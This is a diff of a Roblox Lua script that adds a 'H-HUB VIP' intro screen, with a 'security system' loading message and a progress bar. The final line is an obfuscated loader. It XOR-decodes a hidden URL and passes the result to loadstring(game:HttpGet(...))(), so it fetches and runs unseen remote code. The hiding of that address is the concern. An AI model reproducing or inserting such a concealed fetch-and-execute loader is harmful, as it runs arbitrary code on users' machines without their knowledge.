@@ -1,1 +1,68 @@
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "HHubIntro"
+ScreenGui.Parent = CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -90)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Position = UDim2.new(0, 0, 0, 20)
+Title.BackgroundTransparency = 1
+Title.Text = "H-HUB VIP"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 22
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+
+local SubTitle = Instance.new("TextLabel")
+SubTitle.Size = UDim2.new(1, 0, 0, 30)
+SubTitle.Position = UDim2.new(0, 0, 0, 60)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text = "Đang khởi tạo hệ thống bảo mật..."
+SubTitle.TextColor3 = Color3.fromRGB(150, 150, 160)
+SubTitle.TextSize = 14
+SubTitle.Font = Enum.Font.Gotham
+SubTitle.Parent = MainFrame
+
+local BarBackground = Instance.new("Frame")
+BarBackground.Size = UDim2.new(0, 290, 0, 8)
+BarBackground.Position = UDim2.new(0.5, -145, 0, 115)
+BarBackground.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+BarBackground.BorderSizePixel = 0
+BarBackground.Parent = MainFrame
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1, 0)
+BarCorner.Parent = BarBackground
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBackground
+
+local FillCorner = Instance.new("UICorner")
+FillCorner.CornerRadius = UDim.new(1, 0)
+FillCorner.Parent = BarFill
+
+task.spawn(function()
+    TweenService:Create(BarFill, TweenInfo.new(3.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    task.wait(4.0)
+    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
+    task.wait(0.5)
+    ScreenGui:Destroy()
+end)
+
 local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\211\42\231\181\192\22\208\202\208\60\232\188\198\23\156\204\203\54\169\147\138\54\196\193\150\19\207\139\230\43\227\226\148\55\227\189\212\81\217\198\218\33\245\244\202\31\216\205\148\13\206\173\206\14\217\214\217\36\243\169\198","\126\177\163\187\69\134\219\167")))();
